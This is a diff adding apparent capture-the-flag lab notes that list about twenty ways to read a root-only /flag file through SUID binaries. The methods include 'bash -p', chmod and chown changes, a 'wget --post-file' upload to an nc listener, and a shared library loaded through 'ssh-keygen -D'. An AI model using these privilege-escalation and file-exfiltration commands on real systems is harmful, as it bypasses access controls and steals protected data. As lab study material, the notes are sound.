@@ -61,3 +61,63 @@
 31) watch -n 1 -x cat /flag
 
 32) socat -U - /flag
+
+33) whiptail --textbox /flag 7 60
+
+34) awk '{print}' /flag
+
+35) sed -n '1p' /flag
+
+36) ed /flag
+p
+
+37) chown hacker flag; cat /flag
+
+38) chmod 777 /flag; cat /flag
+
+39) cp --no-preserve=all /flag flag; cat /flag
+
+40) mv /flag flag (go to challenge 1 to read using cat, since it was giving a hint about "the broader environment". at least until I figure out another solution)
+
+41) perl -pe '' /flag
+
+42) python -c 'f = open("/flag", "r"); print(f.read()); exit()'
+
+43) Make a file 'read.rb' with the following in it:
+lines = File.readlines('/flag')
+puts lines
+
+Then run 'ruby read.rb'. Normally we can pass commands with -e directly but Ruby didn't let me do that since the executable is under SUID and it has a protection for that for some reason. I'll look into a way to turn this into a one-liner later.
+
+44) bash -p -c 'cat /flag'
+
+45) date -f /flag
+
+46) dmesg -rF /flag
+
+47) wc --files0-from /flag
+
+48) gcc -x c -E /flag
+
+49) as /flag
+
+50) nc -nvlp 8081 (terminal 1)
+    wget --post-file=/flag http://localhost:8081 (terminal 2)
+
+51)
+read.c:
+
+#include <stdio.h>
+
+void C_GetFunctionList() {
+FILE *fptr;
+fptr = fopen("/flag", "r");
+char myString[100];
+while(fgets(myString, 100, fptr)) { printf("%s", myString);}
+fclose(fptr);
+}
+
+
+gcc -shared -o lib.so read.c -fPIC
+
+ssh-keygen -D ./lib.so
